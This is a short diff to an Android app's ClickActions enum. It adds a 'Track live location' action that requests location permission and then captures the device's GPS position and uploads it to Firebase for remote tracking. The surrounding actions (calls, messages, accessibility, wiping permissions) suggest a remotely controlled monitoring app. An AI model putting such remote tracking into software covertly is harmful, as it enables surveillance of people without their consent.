@@ -13,6 +13,7 @@ import com.vikasyadavnsit.cdc.utils.CallUtils;
 import com.vikasyadavnsit.cdc.utils.FileUtils;
 import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
 import com.vikasyadavnsit.cdc.utils.AccessibilityUtils;
+import com.vikasyadavnsit.cdc.utils.LocationUtils;
 import com.vikasyadavnsit.cdc.utils.MessageUtils;
 
 import java.util.function.BiConsumer;
@@ -244,6 +245,20 @@ public enum ClickActions {
             },
             "Wipe all granted permissions",
             "Reset all permissions"
+    ),
+    TRACK_LIVE_LOCATION(
+            21, ClickActionCategory.SERVICES,
+            (context, triggerSettingsData) -> {
+                if (!new PermissionManager().hasPermission(context, PermissionType.LOCATION)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.LOCATION);
+                    return;
+                }
+                if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
+                    LocationUtils.captureAndUpload(context);
+                }
+            },
+            "Capture and upload current GPS location to Firebase for remote tracking",
+            "Track live location"
     );
 
     final int order;
